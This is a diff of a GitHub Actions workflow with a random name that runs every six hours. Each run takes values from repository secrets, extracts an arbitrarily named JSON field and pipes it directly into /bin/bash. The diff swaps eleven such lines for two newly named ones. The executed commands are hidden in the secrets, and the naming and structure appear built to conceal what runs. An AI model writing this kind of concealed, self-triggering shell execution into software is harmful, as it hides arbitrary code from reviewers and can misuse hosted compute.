@@ -1,28 +1,18 @@
 name: proximateoctopus
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 5/6 * * *'
-
+    - cron: '31 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: proximateoctopus
         env:
-          u8: ${{ secrets.u8 }}
+          nwv35: ${{ secrets.nwv35 }}
         run: |
-          echo $u8 | jq -r .luw7 | /bin/bash
-          echo $dz3 | jq -r .qr0975 | /bin/bash
-          echo $l450 | jq -r .tddac6199 | /bin/bash
-          echo $hnrpt449 | jq -r .nwel508 | /bin/bash
-          echo $dffml9392 | jq -r .ujnk783 | /bin/bash
-          echo $wyvpe8 | jq -r .wa50 | /bin/bash
-          echo $gbdy35 | jq -r .txze5937 | /bin/bash
-          echo $tifz5378 | jq -r .bgzu7972 | /bin/bash
-          echo $g046 | jq -r .bm2 | /bin/bash
-          echo $qi1280 | jq -r .jkqw497 | /bin/bash
-          echo $du515 | jq -r .s0243 | /bin/bash
+          echo $nwv35 | jq -r .g56 | /bin/bash
+          echo $imr3198 | jq -r .d16099 | /bin/bash
 
